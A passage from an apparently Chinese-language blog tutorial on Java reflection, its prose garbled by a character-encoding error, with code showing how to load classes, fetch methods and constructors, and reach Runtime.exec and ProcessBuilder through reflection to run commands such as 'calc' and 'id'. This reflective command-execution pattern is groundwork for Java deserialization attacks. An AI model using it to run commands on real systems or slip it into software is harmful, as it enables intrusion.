class="line">Empty block initial class TrainPrint</span><br><span class="line">Initial class TrainPrint</span><br></pre></td></tr></table></figure><br>è¿™æ˜¯å› ä¸ºåˆå§‹åŒ–çš„è¿‡ç¨‹æŒ‰é¡ºåºåˆ†ä¸ºä¸‰æ­¥<br>1.é™æ€åˆå§‹åŒ–å—<br>é™æ€åˆå§‹åŒ–å—æ˜¯åœ¨ç±»åŠ è½½å®Œæˆåã€å®ä¾‹åŒ–ä»»ä½•å¯¹è±¡ä¹‹å‰æ‰§è¡Œçš„ã€‚<br>é™æ€åˆå§‹åŒ–å—åªæ‰§è¡Œä¸€æ¬¡ï¼Œç”¨äºåˆå§‹åŒ–ç±»çš„é™æ€å˜é‡ã€‚<br>2.å®ä¾‹åˆå§‹åŒ–å—<br>å®ä¾‹åˆå§‹åŒ–å—æ˜¯åœ¨æ¯æ¬¡åˆ›å»ºç±»çš„å®ä¾‹æ—¶æ‰§è¡Œçš„ã€‚<br>å®ä¾‹åˆå§‹åŒ–å—åœ¨æ„é€ æ–¹æ³•ä¹‹å‰æ‰§è¡Œã€‚<br>3.æ„é€ æ–¹æ³•<br>æ„é€ æ–¹æ³•æ˜¯åœ¨å®ä¾‹åˆå§‹åŒ–å—ä¹‹åæ‰§è¡Œçš„ï¼Œç”¨äºåˆå§‹åŒ–å¯¹è±¡çš„å®ä¾‹å˜é‡ã€‚</p><h4 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException &#123;</span><br><span class="line">        Class clazz=Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">        System.out.println(clazz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">class java.lang.Runtime</span><br></pre></td></tr></table></figure><h3 id="ClassLoader-getSystemClassLoader-loadClass"><a href="#ClassLoader-getSystemClassLoader-loadClass" class="headerlink" title="ClassLoader.getSystemClassLoader().loadClass"></a>ClassLoader.getSystemClassLoader().loadClass</h3><p>ä½¿ç”¨è¿™ä¸ªä¹Ÿå¯ä»¥åŠ è½½ç±»ï¼Œä½†æ˜¯å’ŒforNameä¸åŒçš„æ˜¯è¿™ä¸ªæ–¹æ³•ä¸ä¼šåˆå§‹åŒ–ç±»<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        System.out.println(clazz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">java</span>.lang.Runtime</span><br></pre></td></tr></table></figure></p><h3 id="ç±»å-class"><a href="#ç±»å-class" class="headerlink" title="ç±»å.class"></a>ç±»å.class</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = java.lang.Runtime.class;</span><br><span class="line">        System.out.println(clazz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">java</span>.lang.Runtime</span><br></pre></td></tr></table></figure><h3 id="getclass"><a href="#getclass" class="headerlink" title="getclass()"></a>getclass()</h3><p>å½“ç¨‹åºé‡Œæœ‰ä»¥åŠåŠ è½½çš„ç±»æ—¶å¯ä»¥ä½¿ç”¨getclassæ¥è·å–ç±»<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; clazz2= clazz.getClass();</span><br><span class="line">        System.out.println(clazz2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="è·å–æ–¹æ³•"><a href="#è·å–æ–¹æ³•" class="headerlink" title="è·å–æ–¹æ³•"></a>è·å–æ–¹æ³•</h2><h3 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod()"></a>getMethod()</h3><p>è¿™ä¸ªå‡½æ•°åªèƒ½è·å–ä¸€ä¸ªæ–¹æ³•ï¼Œè¿”å›çš„æ—¶ä¸€ä¸ªæ–¹æ³•<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException&#123;</span><br><span class="line">        <span class="comment">// ä½¿ç”¨ Class.forName åŠ è½½ç±»</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–æŒ‡å®šæ–¹æ³•</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ‰“å°æ–¹æ³•çš„åç§°</span></span><br><span class="line">        System.out.println(method);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">public</span> java.lang.Process java.lang.Runtime.exec(java.lang.String) <span class="keyword">throws</span> java.io.IOException</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h3 id="getMethods"><a href="#getMethods" class="headerlink" title="getMethods"></a>getMethods</h3><p>è¿”å›çš„æ˜¯ä¸€ä¸ªæ–¹æ³•çš„æ•°ç»„<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException&#123;</span><br><span class="line">        <span class="comment">// ä½¿ç”¨ Class.forName åŠ è½½ç±»</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–æŒ‡å®šæ–¹æ³•</span></span><br><span class="line">        Method[] methods = clazz.getMethods();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(Method method:methods)</span><br><span class="line">        System.out.println(methods);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br><span class="line">[Ljava.lang.reflect.Method;@70177ecd</span><br></pre></td></tr></table></figure></p><h3 id="getDeclaredMethod"><a href="#getDeclaredMethod" class="headerlink" title="getDeclaredMethod"></a>getDeclaredMethod</h3><p>ç”¨æ³•ä¸getMethodå’ŒgetMethodsä¸€æ ·å³å¯ä»¥è·å–å•ä¸ªä¹Ÿå¯ä»¥è·å–å¤šä¸ª</p><h2 id="åˆ›å»ºå¯¹è±¡å®ä¾‹"><a href="#åˆ›å»ºå¯¹è±¡å®ä¾‹" class="headerlink" title="åˆ›å»ºå¯¹è±¡å®ä¾‹"></a>åˆ›å»ºå¯¹è±¡å®ä¾‹</h2><h3 id="newInstance"><a href="#newInstance" class="headerlink" title="newInstance()"></a>newInstance()</h3><p>è¿™ä¸ªå‡½æ•°æ˜¯é€šè¿‡è°ƒç”¨ç±»çš„æ— å‚æ„é€ æ–¹æ³•æ¥å®ä¾‹åŒ–å¯¹è±¡çš„ï¼Œå³å½“è¦å®ä¾‹åŒ–çš„å¯¹è±¡<strong>æ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•</strong>æˆ–è€…å…¶æ„é€ æ–¹æ³•ä¸º<strong>ç§æœ‰çš„</strong>æ—¶è¿™ä¸ªå‡½æ•°å°†æ— æ³•å°†å¯¹è±¡ç›´æ¥å®ä¾‹åŒ–ã€‚<br>æœ€å¸¸è§çš„ä¾¿æ˜¯åœ¨å®ä¾‹åŒ–Runtimeç±»æ—¶<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException,IllegalAccessException,InstantiationException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Object obj= clazz.newInstance();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">------------------------------------------------------------------------------------</span><br><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> java.lang.IllegalAccessException: <span class="keyword">class</span> <span class="title class_">Main</span> cannot access a member of <span class="keyword">class</span> <span class="title class_">java</span>.lang.Runtime (in <span class="keyword">module</span> java.base) with modifiers <span class="string">&quot;private&quot;</span></span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„ä»£ç æŠ¥é”™äº†ï¼Œè¿™æ˜¯å› ä¸ºRuntimeç±»çš„æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•ç›´æ¥ä½¿ç”¨newInstance()å¾—åˆ°å®ä¾‹å¯¹è±¡ï¼Œå…·ä½“æ€ä¹ˆå¾—åˆ°æˆ‘ä¼šåœ¨ä¸‹æ–‡ç»™å‡º</p><h4 id="è¯­æ³•-1"><a href="#è¯­æ³•-1" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h4><p>class.newInstance()</p><h2 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h2><h3 id="invoke"><a href="#invoke" class="headerlink" title="invoke()"></a>invoke()</h3><p>è¿™ä¸ªå‡½æ•°çš„ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object obj,Object... args)</span></span><br></pre></td></tr></table></figure><br>ä¸€èˆ¬åœ¨åå°„ä¸­ä¸newInstance()è”åˆèµ·æ¥ç”¨<br>1.å¦‚æœæ–¹æ³•æ˜¯ä¸€ä¸ªæ™®é€šæ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»å¯¹è±¡</p><p>2.å¦‚æœæ–¹æ³•æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»<br>æ‰“ä¸ªæ¯”æ–¹æˆ‘ä»¬åœ¨æ­£å¸¸ä½¿ç”¨ç±»çš„æ–¹æ³•æ˜¯å®‰ä¸‹é¢çš„æ–¹æ³•æ¥ä½¿ç”¨çš„<br><code>[1].method([2],[3],....)</code><br>è€Œinvokeæ˜¯å¦‚ä¸‹æ–¹æ³•ä½¿ç”¨çš„<br><code>method.invoke([1],[2],[3])</code><br>å³å…¶æ˜¯å°†å®ä¾‹å¯¹è±¡æ”¾åœ¨äº†ç¬¬ä¸€ä¸ªå‚æ•°é‡Œ</p><h1 id="æ„é€ Runtimeçš„å‘½ä»¤æ‰§è¡Œ"><a href="#æ„é€ Runtimeçš„å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="æ„é€ Runtimeçš„å‘½ä»¤æ‰§è¡Œ"></a>æ„é€ Runtimeçš„å‘½ä»¤æ‰§è¡Œ</h1><p>é¦–å…ˆä¸Šæ–‡æˆ‘æœ‰æåˆ°ï¼ŒRuntimeç±»çš„æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œå³æˆ‘ä»¬ä½¿ç”¨å¦‚ä¸‹çš„ä»£ç å¸¦åå°„å¾—åˆ°execæ˜¯ä¼šæŠ¥é”™çš„<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="string">&quot;id&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><img src="/2024/07/14/java%E5%8F%8D%E5%B0%84/3.png" class="" title="alt text"><br>å¯æ˜¯æ—¢ç„¶å¼€å‘è€…ç»™å‡ºè¿™ä¸ªåŒ…æˆ‘ä»¬å°±åº”è¯¥å¯ä»¥ä½¿ç”¨ï¼Œè€ŒRuntimeæ˜¯å•ä¾‹æ¨¡å¼ï¼Œåªèƒ½é€šè¿‡Runtime.getRuntime()æ¥å¾—åˆ°å®ä¾‹<br><img src="/2024/07/14/java%E5%8F%8D%E5%B0%84/1.png" class="" title="alt text"><br>å³æˆ‘ä»¬åªè¦åˆ©ç”¨invokeæ¥æ‰§è¡ŒRuntimeçš„getRuntimeæ–¹æ³•å°±å¯ä»¥å¾—åˆ°Runtimeçš„å®ä¾‹å¯¹è±¡ä»£ç å¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class clazz=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Object Run=clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz);</span><br><span class="line">        System.out.println(Run);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------------------------------</span><br><span class="line">java.lang.Runtime@2f4d3709</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>å¯ä»¥çœ‹åˆ°æˆåŠŸé€šè¿‡åå°„å¾—åˆ°äº†Runtimeçš„å®ä¾‹æ—¢ç„¶å¾—åˆ°äº†Runtimeçš„å®ä¾‹é‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨Runtimeé‡Œçš„æ‰€æœ‰æ–¹æ³•äº†<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class clazz=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//Runtime.getRuntime.exec(&quot;calc&quot;)</span></span><br><span class="line">        clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz),<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/07/14/java%E5%8F%8D%E5%B0%84/2.png" class=""><br>å¯ä»¥å‘ç°æˆåŠŸä½¿ç”¨execå¼¹è®¡ç®—æœºï¼ˆè¯´å®è¯ä¸ªäººæ„Ÿè§‰è¿™ä¸ªåå°„çš„è¿‡ç¨‹æ˜¯ä»åå¾€å‰çœ‹ï¼Œå…ˆçœ‹æ–¹æ³•åœ¨çœ‹ç±»ã€‚æ„Ÿè§‰æœ‰ç‚¹åƒé€’å½’ï¼‰</p><h1 id="æ²¡æœ‰æ— å‚æ„é€ å‡½æ•°å’Œç§æœ‰å‡½æ•°æ„é€ çš„åå°„"><a href="#æ²¡æœ‰æ— å‚æ„é€ å‡½æ•°å’Œç§æœ‰å‡½æ•°æ„é€ çš„åå°„" class="headerlink" title="æ²¡æœ‰æ— å‚æ„é€ å‡½æ•°å’Œç§æœ‰å‡½æ•°æ„é€ çš„åå°„"></a>æ²¡æœ‰æ— å‚æ„é€ å‡½æ•°å’Œç§æœ‰å‡½æ•°æ„é€ çš„åå°„</h1><p>ä¸Šæ–‡æˆ‘ä»¬å­¦äº†åå°„çš„çš®æ¯›ï¼Œå¯¹åå°„æœ‰äº†ä¸€å®šçš„äº†è§£ä½†æ˜¯è¿˜æ˜¯æœ‰ä¸¤ä¸ªç–‘é—®å°±æ˜¯å¦‚æœæ²¡æœ‰æ— å‚æ„é€ å‡½æ•°è¦æ€ä¹ˆæ„å»ºåå°„ï¼Œå¦‚æœæ˜¯ç§æœ‰çš„å‡½æ•°ä½†æ˜¯æ²¡æœ‰Runtimeçš„å•ä¾‹æ¨¡å¼æˆ‘ä»¬åº”è¯¥æ€ä¹ˆæ¥æ„é€ åå°„ã€‚</p><h2 id="æ²¡æœ‰æ— å‚æ„é€ å‡½æ•°æ„é€ çš„åå°„"><a href="#æ²¡æœ‰æ— å‚æ„é€ å‡½æ•°æ„é€ çš„åå°„" class="headerlink" title="æ²¡æœ‰æ— å‚æ„é€ å‡½æ•°æ„é€ çš„åå°„"></a>æ²¡æœ‰æ— å‚æ„é€ å‡½æ•°æ„é€ çš„åå°„</h2><p>è¦æƒ³æ„é€ è¿™ä¸ªåå°„æˆ‘ä»¬è¦å…ˆäº†è§£ä¸€ä¸ªå‡½æ•°getConstructor()</p><h3 id="getConstructor"><a href="#getConstructor" class="headerlink" title="getConstructor()"></a>getConstructor()</h3><p>è¿™ä¸ªå‡½æ•°ä¸getmethodç›¸ä¼¼ä½†æ˜¯è¿™ä¸ªå‡½æ•°å¯ä»¥è·å–é€‰å®šå‚æ•°çš„æ„é€ æ–¹æ³•å¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getConstructor(List.class);</span><br><span class="line">        System.out.println(constructor);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">public</span> java.lang.ProcessBuilder(java.util.List)</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°getConstructor()å¾—åˆ°äº†ä¸€ä¸ªå‚æ•°ä¸º<code>List&lt;String&gt;</code>çš„æ„é€ æ–¹æ³•ã€‚</p><h3 id="newInstance-â€¦"><a href="#newInstance-â€¦" class="headerlink" title="newInstance(â€¦)"></a>newInstance(â€¦)</h3><p>è¿™é‡Œæˆ‘ä»¬è¦åœ¨è®²ä¸€ä¸‹newInstance()ï¼Œè¿™ä¸ªæˆ‘åœ¨ä¸Šæ–‡æœ‰è®²è¿‡ä½†æ˜¯è®²çš„ä¸å¤Ÿè¯¦ç»†ã€‚newInstance()å…¶å®æœ‰ä¸¤ç§å®ä¾‹åŒ–çš„æ–¹å¼ï¼Œåˆ†åˆ«ä¸ºclass.newInstance()å’ŒConstructor.newIstance(&lt;å‚æ•°&gt;)ç¬¬ä¸€ç§å°±æ˜¯æˆ‘ä¸Šæ–‡è¯´çš„æ— å‚æ„é€ å®ä¾‹ï¼Œè€Œç¬¬äºŒç§å°±æ˜¯åˆ©ç”¨æ„é€ æ–¹æ³•å’Œå…¶åŒ¹é…çš„å‚æ•°æ¥è¿›è¡Œå®ä¾‹åŒ–å¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getConstructor(List.class);</span><br><span class="line">        Object obj=constructor.newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>));</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span 